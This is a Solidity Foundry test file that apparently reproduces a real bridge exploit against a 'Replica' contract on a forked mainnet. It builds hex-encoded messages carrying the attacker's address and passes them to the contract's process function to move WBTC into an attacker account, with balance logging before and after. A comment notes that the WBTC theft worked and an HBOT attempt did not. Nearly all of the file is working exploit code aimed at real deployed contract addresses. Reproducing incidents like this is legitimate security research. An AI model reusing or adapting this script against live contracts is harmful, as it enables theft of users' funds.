// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../../src/PoC/PoC_Hack_c/IReplica.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";



contract DecoderCheapBridge {
    //  This contract was written to test te txs from the contract Replica


    // Decode the process & proveAndProcess tx:
    function decodeUpdate(bytes memory data) external pure returns 
        (   bytes32 _oldRoot,
            bytes32 _newRoot,
            bytes memory _signature) {
            (   _oldRoot,_newRoot,_signature) = abi.decode(data, (bytes32, bytes32, bytes));
    }

    function decodeProveAndProcess(bytes memory data) public pure returns 
        (   bytes memory message, 
            bytes32[32] memory proof, 
            uint256 index) {

            (message,proof,index) = abi.decode(data, (bytes, bytes32[32], uint256));
    }

    function decodeProcess(bytes memory data) public pure returns 
        (bytes memory message) {
            (message) = abi.decode(data, (bytes));
    }
}

contract ReplicaTest is Test, DecoderCheapBridge {
    // Note: Block.number = 15115370    The WBTC steal were successful but the HBOT wasn't
    IReplica public target;
    IERC20 public wbtc;
    IERC20 public hbot;
    address public replicaAddress;

    address public attacker;

    function setUp() public {
        vm.createSelectFork(vm.envString("FOUNDRY_INFURA"));
        replicaAddress = address(0x5D94309E5a0090b165FA4181519701637B6DAEBA);
        target = IReplica(replicaAddress);
        wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
        hbot = IERC20(0xE5097D9baeAFB89f9bcB78C9290d545dB5f9e9CB);
        attacker = makeAddr("userKenat");
    }


    function testWBTCSteal() public {
        vm.rollFork(15115370);   
        // The hex was made with the Default view
        uint256 attackerBalanceInit = wbtc.balanceOf(attacker);
        console.log(" ");
        console.log("Steal WBTC with natural language!");
        console.log(" ");
        console.log("Initial attacker balance: ", attackerBalanceInit);
      

        bytes memory message_a = hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000d16265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000";
        bytes memory message_b = hex"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a000000000000000000000000000000";
        bytes memory message = bytes.concat(message_a, abi.encodePacked(attacker), message_b);

        vm.prank(attacker);
        target.process(decodeProcess(message));

        uint256 attackerBalanceFin = wbtc.balanceOf(attacker);
        console.log(" ");
        console.log("Final attacker balance: ", attackerBalanceFin);
    }

    function testWBTCStealWithBytecode() public {
        vm.rollFork(15259100);   
        // The hex was made with the Original view
        uint256 attackerBalanceInit = wbtc.balanceOf(attacker);
        console.log(" ");
        console.log("Steal WBTC with natural hex language!");
        console.log(" ");
        console.log("Initial attacker balance: ", attackerBalanceInit);
      
        bytes memory bytecode_a = hex"928bc4b2000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000d16265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000";
        bytes memory bytecode_b = hex"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a000000000000000000000000000000";

        bytes memory bytecode = bytes.concat(bytecode_a, abi.encodePacked(attacker), bytecode_b);

        vm.prank(attacker);
        (bool success, ) = replicaAddress.call(bytecode);
        //assertFalse(!success);

        uint256 attackerBalanceFin = wbtc.balanceOf(attacker);
        console.log(" ");
        console.log("Final attacker balance: ", attackerBalanceFin);

    }

    

}
